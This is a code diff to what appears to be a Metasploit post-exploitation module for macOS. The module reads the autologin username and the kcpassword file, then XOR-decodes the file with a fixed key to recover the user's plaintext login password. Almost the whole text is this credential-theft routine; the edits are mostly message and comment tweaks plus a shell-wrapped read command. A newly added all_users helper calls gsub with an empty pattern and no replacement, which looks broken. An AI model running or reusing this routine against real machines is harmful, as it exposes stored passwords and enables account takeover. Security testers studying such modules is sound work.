@@ -38,22 +38,24 @@ class Metasploit3 < Msf::Post
   def run
     # ensure the user is root (or can read the kcpassword)
     if not user == 'root'
-      fail_with "Root privileges required to read kcpassword"
+      fail_with "Root privileges are required to read kcpassword file"
     end
 
     # read the autologin account from prefs plist
-    autouser = cmd_exec('defaults read /Library/Preferences/com.apple.loginwindow "autoLoginUser" "username"')
+    read_cmd = "defaults read /Library/Preferences/com.apple.loginwindow autoLoginUser username"
+    autouser = cmd_exec("/bin/sh -c '#{read_cmd} 2> /dev/null'")
+
     if autouser.present?
       print_status "User #{autouser} has autologin enabled, decoding password..."
     else
-      fail_with "No users on this machine have autologin enabled."
+      fail_with "No users on this machine have autologin enabled"
     end
 
     # kcpass contains the XOR'd bytes
     kcpass = read_file(kcpassword_path)
     key = AUTOLOGIN_XOR_KEY
 
-    # decoding routing, slices into 11 byte chunks and XOR's each chunk
+    # decoding routine, slices into 11 byte chunks and XOR's each chunk
     decoded = kcpass.bytes.to_a.each_slice(key.length).map do |kc|
       kc.each_with_index.map { |byte, idx| byte ^ key[idx] }.map(&:chr).join
     end.join.sub(/\x00.*$/, '')
@@ -77,5 +79,9 @@ class Metasploit3 < Msf::Post
 
   def user
     @user ||= cmd_exec('whoami').chomp
+  end
+
+  def all_users
+    cmd_exec('ls /Users').gsub(//)
   end
 end
